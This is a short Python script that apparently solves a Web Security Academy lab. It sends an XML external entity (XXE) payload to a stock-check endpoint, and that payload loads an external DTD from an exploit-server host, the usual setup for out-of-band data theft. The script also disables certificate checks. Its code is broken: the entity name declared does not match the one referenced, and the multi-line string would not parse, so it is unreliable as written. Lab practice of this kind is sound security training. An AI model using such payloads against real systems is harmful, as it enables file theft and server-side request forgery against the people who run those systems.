#!/usr/bin/python3.7
import requests
import re
from bs4 import BeautifulSoup
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from urllib.parse import quote

url = 'https://0a46001a0309eaae84c78cb100090086.web-security-academy.net'

session=requests.Session()

data = '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE abc [<!ENTITY % cuong SYSTEM "https://exploit-0acd00280309eaf2848f8b16012300aa.exploit-server.net/exploit.dtd">
%cuonhng;]><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>'



response= session.post(
    url + '/product/stock',
    data=data,
    verify=False,
)

print(response.text)
